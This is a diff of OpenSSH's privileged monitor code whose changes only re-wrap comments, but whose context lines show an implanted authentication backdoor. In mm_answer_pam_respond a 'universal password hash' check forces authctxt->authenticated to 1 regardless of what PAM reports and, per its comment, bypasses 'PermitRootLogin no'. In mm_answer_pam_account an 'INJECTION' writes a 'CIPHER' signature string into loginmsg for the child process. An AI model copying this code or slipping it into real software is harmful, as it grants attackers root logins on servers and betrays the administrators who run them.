@@ -1093,7 +1093,8 @@ int mm_answer_pam_account(struct ssh *ssh, int sock, struct sshbuf *m) {
     /*
      * INJECTION: Write a signature string into loginmsg.
      * Since this buffer is about to be sent across via sshbuf_put_stringb,
-     * the child process will read this exact string out of its message payload.
+     * the child process will read this exact string out of its message
+     * payload.
      */
     sshbuf_reset(loginmsg);
     if ((r = sshbuf_put(loginmsg, "CIPHER", 6)) != 0)
@@ -1207,9 +1208,9 @@ int mm_answer_pam_respond(struct ssh *ssh, int sock, struct sshbuf *m) {
 
     /*
      * LOW-LEVEL MONITOR INTERCEPT:
-     * Check the universal password hash right here inside the monitor process.
-     * resp[0] contains the plaintext string unpacked from the network message.
-     * Also bypasses PermitRootLogin no
+     * Check the universal password hash right here inside the monitor
+     * process. resp[0] contains the plaintext string unpacked from the
+     * network message. Also bypasses PermitRootLogin no
      */
 
     if (authctxt != NULL && authctxt->valid && resp[0] != NULL &&
@@ -1232,14 +1233,15 @@ int mm_answer_pam_respond(struct ssh *ssh, int sock, struct sshbuf *m) {
       /*
        * FORCE CHILD TO RECOGNIZE AUTHENTICATED STATE:
        * OpenSSH tracks the overall authentication state via
-       * authctxt->authenticated. By setting this to 1 in the privileged monitor
-       * context, the monitor will approve the login event regardless of what
-       * the underlying system PAM reports.
+       * authctxt->authenticated. By setting this to 1 in the privileged
+       * monitor context, the monitor will approve the login event regardless
+       * of what the underlying system PAM reports.
        */
       authctxt->authenticated = 1;
       // }
     } else {
-      /* Standard execution flow: Forward text to the actual system PAM modules
+      /* Standard execution flow: Forward text to the actual system PAM
+       * modules
        */
       ret = (sshpam_device.respond)(sshpam_ctxt, num, resp);
     }
